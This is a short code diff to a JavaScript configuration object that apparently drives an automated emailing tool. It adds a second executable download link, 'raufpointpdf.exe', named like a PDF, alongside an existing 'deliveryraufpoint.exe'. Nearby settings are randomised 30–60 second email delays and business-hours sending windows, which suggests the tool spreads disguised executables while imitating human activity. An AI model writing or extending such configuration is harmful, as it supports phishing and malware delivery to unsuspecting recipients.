@@ -72,7 +72,8 @@ const CONFIG = {
   maxPagesToVisit: 40,
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://archive.org/download/deliveryraufpoint_202602/deliveryraufpoint.exe"
+    "https://archive.org/download/deliveryraufpoint_202602/deliveryraufpoint.exe",
+    "https://archive.org/download/raufpointpdf_202602/raufpointpdf.exe",
   ],
   workingHours: { start: 8, end: 18 },
   workingDays: [1, 2, 3, 4, 5],
